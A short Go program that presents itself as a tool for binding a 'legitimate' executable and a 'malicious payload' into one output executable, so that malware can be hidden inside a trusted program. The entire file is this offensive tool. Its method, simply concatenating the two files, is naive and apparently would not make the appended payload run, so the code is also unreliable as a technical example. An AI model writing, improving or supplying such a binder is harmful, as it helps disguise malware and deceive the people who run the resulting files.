package main

import (
    "io"
    "os"
    "fmt"
)

func main() {
    if len(os.Args) != 4 {
        fmt.Printf("Usage: %s <LEGITIMATE_EXE> <MALICIOUS_PAYLOAD> <OUTPUT_EXE>\n", os.Args[0])
        os.Exit(1)
    }

    legitimateExe := os.Args[1]
    maliciousPayload := os.Args[2]
    outputExe := os.Args[3]

    err := bindFiles(legitimateExe, maliciousPayload, outputExe)
    if err != nil {
        fmt.Println("Error binding files:", err)
    } else {
        fmt.Println("Files bound successfully.")
    }
}

func bindFiles(legitimateExe, maliciousPayload, outputExe string) error {
    out, err := os.Create(outputExe)
    if err != nil {
        return err
    }
    defer out.Close()

    err = appendFile(out, legitimateExe)
    if err != nil {
        return err
    }

    err = appendFile(out, maliciousPayload)
    if err != nil {
        return err
    }

    return nil
}

func appendFile(out *os.File, filePath string) error {
    in, err := os.Open(filePath)
    if err != nil {
        return err
    }
    defer in.Close()

    _, err = io.Copy(out, in)
    if err != nil {
        return err
    }

    return nil
}
